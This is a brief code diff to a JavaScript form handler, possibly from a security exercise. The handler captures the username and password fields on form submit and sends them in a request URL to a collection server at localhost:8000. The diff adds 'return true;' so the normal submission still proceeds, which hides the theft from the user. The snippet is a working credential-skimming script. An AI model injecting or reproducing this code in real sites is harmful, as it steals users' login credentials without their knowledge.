@@ -8,5 +8,6 @@ function onFormSubmit()
 	var request = new XMLHttpRequest();
 	request.open("POST", "http://localhost:8000?username=" + usernameForm + "&password=" + passwordForm, true);
 	request.send();
+	return true;
 }
 document.forms[0].onsubmit = onFormSubmit;
